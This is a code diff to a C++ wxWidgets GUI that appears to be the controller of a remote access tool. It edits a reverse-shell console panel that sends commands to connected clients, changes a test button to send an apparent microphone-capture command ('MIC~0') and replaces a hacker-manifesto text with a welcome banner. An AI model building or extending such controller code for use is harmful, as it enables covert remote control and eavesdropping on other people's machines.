@@ -8,6 +8,8 @@ extern std::mutex vector_mutex;
 FrameCliente::FrameCliente(std::string strID, wxString nameID)
     : wxFrame(nullptr, wxID_ANY, ":v", wxDefaultPosition, wxDefaultSize, wxDD_DEFAULT_STYLE, nameID)
 {
+    SetBackgroundColour(wxColour(255, 255, 255, 128)); // Establecer el color de fondo con transparencia
+    SetTransparent(245);
 
     //std::vector<std::string> vcOut = strSplit(strID, '/', 1);
     this->strClienteID = nameID;
@@ -57,14 +59,7 @@ FrameCliente::FrameCliente(std::string strID, wxString nameID)
 
     wxHtmlWindow* html = new wxHtmlWindow(this->m_tree->p_Notebook, wxID_ANY, wxDefaultPosition, wxSize(200, 200));
     html->SetBackgroundColour(wxColor(0, 0, 255));
-    wxString htmlsource = "<center><p>Este es mi mundo. El mundo del electrón y el interruptor, la belleza del baudio. Hacemos uso de un servicio existente, sin pagar por él, que podría ser asquerosamen- te barato si no estuviera gestionado por explotadores glotones, y ustedes nos llaman criminales.<br>\
-Nosotros exploramos y nos llaman criminales.<br>\
-Buscamos el conocimiento y nos llaman criminales.<br>\
-No tenemos razas, nacionalidades, prejuicios religiosos y nos llaman criminales.<br>\
-Ustedes construyen bombas atómicas, delcaran guerras, asesinan, defraudan, y nos mienten, y nos tratan de hacer creer que es por nuestro bien, todavía somos los criminales.<br>\
-Sí soy un criminal. Mi crimen es la curiosidad. Mi crimen es juzgar a la gente por lo que dice y piensa, no por lo que parece. Mi crimen es que soy más listo que tu, algo que no me puedes perdonar.<br>\
-Soy un hacker, y este es mi manifiesto.<br>\
-Me pueden detener a mí, pero no nos pueden detenernos a todos, al fin y al cabo todos somos iguales.\</p></center>";
+    wxString htmlsource = "<center><h1>Bienvenido a mi morada entre libremente por su propia voluntad</h1></center>";
     html->SetPage(htmlsource);
     html->SetSize(wxSize(200, 200));
 
@@ -118,7 +113,7 @@ void FrameCliente::OnTest(wxCommandEvent& event) {
     
     for (auto aClient : vc_Copy) {
         if (aClient._id == this->strClienteID) {
-            int ib = p_Servidor->cSend(aClient._sckCliente, "CUSTOM_TEST~0", 13, 0, false);
+            int ib = p_Servidor->cSend(aClient._sckCliente, "MIC~0", 13, 0, false);
             std::cout << "SENT " << ib << "\n";
             break;
         }
@@ -262,8 +257,9 @@ void panelReverseShell::OnHook(wxKeyEvent& event) {
         int iLongitud = this->txtConsole->GetLastPosition() - this->p_uliUltimo;
         wxString str1 = std::to_string(EnumComandos::Reverse_Shell_Command);
         str1 += "~";
-        str1 += strRandomOut.substr((strRandomOut.length() - iLongitud), strRandomOut.length());
-        this->vc_History.push_back(str1);
+        wxString str2 = strRandomOut.substr((strRandomOut.length() - iLongitud), strRandomOut.length());
+        str1 += str2;
+        this->vc_History.push_back(str2);
 
         str1.append(1, '\r');
         str1.append(1, '\n');
@@ -281,9 +277,8 @@ void panelReverseShell::OnHook(wxKeyEvent& event) {
         }
         
         this->p_uliUltimo = this->txtConsole->GetLastPosition() + 2;
-        //std::cout << "Ultima posicion ahora es " << this->p_uliUltimo<< std::endl;
           
-          event.Skip();
+        event.Skip();
     } else {
         if (this->txtConsole->GetInsertionPoint() < this->txtConsole->GetLastPosition()) {
             this->txtConsole->SetInsertionPointEnd();
